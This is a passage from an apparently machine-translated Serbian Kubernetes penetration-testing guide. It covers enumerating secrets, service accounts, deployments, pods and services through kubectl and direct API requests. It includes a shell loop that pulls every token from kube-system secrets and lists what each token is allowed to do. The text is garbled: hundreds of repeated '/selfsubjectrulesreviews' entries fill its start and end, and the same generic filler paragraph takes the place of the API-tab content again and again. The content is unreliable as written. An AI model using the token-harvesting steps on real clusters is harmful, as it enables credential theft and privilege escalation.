`/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/self
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Ako možete da pročitate tajne, možete koristiti sledeće linije da biste dobili privilegije povezane sa svakim tokenom:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Dobijanje Servisnih Računa

Kao što je diskutovano na početku ove stranice **kada se pokrene pod, obično mu se dodeljuje servisni račun**. Stoga, listanje servisnih računa, njihovih dozvola i gde se izvršavaju može omogućiti korisniku da eskalira privilegije.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan i da li možete pristupiti informacijama o čvorovima i kontejnerima.

2. **Kubernetes API server**: Istražite Kubernetes API server kako biste identifikovali resurse, servise i ostale objekte u klasteru.

3. **API endpointi**: Proučite sve dostupne API endpointe kako biste razumeli funkcionalnosti i moguće tačke za napad.

4. **Autentikacija i autorizacija**: Proverite postavke autentikacije i autorizacije API-ja kako biste identifikovali eventualne slabosti.

5. **API verzije**: Istražite podržane verzije API-ja kako biste identifikovali potencijalne ranjivosti poznate u određenim verzijama.

6. **API tokeni**: Proverite da li su API tokeni dobro zaštićeni i da li postoji mogućnost njihovog neovlašćenog pristupa.

Prilikom enumeracije API-ja, važno je pažljivo dokumentovati sve pronađene informacije radi dalje analize i planiranja testiranja bezbednosti. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Dobijanje implementacija

Implementacije određuju **komponente** koje treba **pokrenuti**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na portu 10250 ili 10255. Možete koristiti alat kao što je `curl` za slanje zahteva i pregled odgovora.

2. **Kubernetes API server**: Istražite Kubernetes API server koji može biti dostupan na portu 6443. Pokušajte da pristupite API serveru i proverite koje operacije su dozvoljene.

3. **API endpointi**: Proučite dokumentaciju Kubernetes API-ja kako biste identifikovali sve dostupne endpointe i resurse. Ovo vam može pomoći da bolje razumete strukturu API-ja i pronađete potencijalne tačke za napad.

4. **Autentikacija i autorizacija**: Ispitajte kako su podešene autentikacija i autorizacija za pristup API-jima. Identifikujte da li postoje slabosti u konfiguraciji koje bi mogle dovesti do neovlašćenog pristupa.

5. **API tokeni**: Potražite API tokene koji se koriste za pristup API-jima. Proverite da li su ovi tokeni bezbedno čuvani i da li postoji mogućnost njihovog zloupotrebljavanja.

6. **API greške**: Testirajte API-jeve kako biste identifikovali moguće greške ili ranjivosti koje bi mogle biti iskorišćene za napad.

Pravilna enumeracija API-ja može vam pomoći da bolje razumete bezbednosne propuste u Kubernetes klasteru i preduzmete odgovarajuće mere zaštite.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Dobijanje Podova

Podovi su stvarni **kontejneri** koji će se **izvršavati**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti i slabe tačke. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kube-APIserver Endpoints**: Proverite sve dostupne endpointe na kube-apiserveru kako biste identifikovali resurse i servise.

2. **Kubelet API**: Istražite kubelet API kako biste dobili informacije o nodovima i njihovim specifikacijama.

3. **Kubernetes Dashboard API**: Ako je Kubernetes Dashboard omogućen, istražite njegov API kako biste identifikovali potencijalne ranjivosti.

4. **Kube-Proxy API**: Proverite Kube-Proxy API za informacije o servisima i pravilima mreže.

5. **Kube-Scheduler API**: Istražite Kube-Scheduler API za informacije o raspoređivanju resursa.

6. **Kube-Controller-Manager API**: Proverite Kube-Controller-Manager API za informacije o kontrolerima i njihovim konfiguracijama.

7. **Third-Party API**: Ako koristite dodatne alate ili servise, istražite i njihove API-jeve za moguće ranjivosti.

Prilikom enumeracije API-ja, važno je pažljivo analizirati dobijene informacije i identifikovati potencijalne tačke za napad kako biste osigurali bezbednost Kubernetes klastera. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Dobijanje Usluga

Kubernetes **servisi** se koriste da **izlože uslugu na određenom portu i IP adresi** (koja će delovati kao balanser opterećenja ka podovima koji zapravo pružaju uslugu). Ovo je zanimljivo znati gde možete pronaći druge usluge koje možete pokušati da napadnete.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na portu 10250 ili 10255 na čvorovima klastera. Možete koristiti alat kao što je `kubeletctl` za interakciju sa API-jem.

2. **Kubernetes API server**: Istražite Kubernetes API server koji može biti dostupan na portu 6443 ili drugom konfigurisanom portu. Možete koristiti alate poput `kubectl` ili `kube-apiserver` za interakciju sa API-jem.

3. **API endpointi**: Istražite različite API endpointe kao što su `/api`, `/apis`, `/healthz`, `/version`, `/metrics`, `/logs`, `/exec`, `/attach`, `/portforward`, `/run`, `/proxy`, `/debug`, `/swaggerapi`, `/openapi`, `/ui`, `/swagger-ui`, `/k8s`, `/kubernetes`, `/health`, `/livez`, `/readyz`, `/pods`, `/nodes`, `/services`, `/namespaces`, `/deployments`, `/replicasets`, `/jobs`, `/cronjobs`, `/configmaps`, `/secrets`, `/ingresses`, `/persistentvolumes`, `/storageclasses`, `/events`, `/componentstatuses`, `/customresourcedefinitions`, `/apiservices`, `/tokenreviews`, `/subjectaccessreviews`, `/selfsubjectaccessreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, 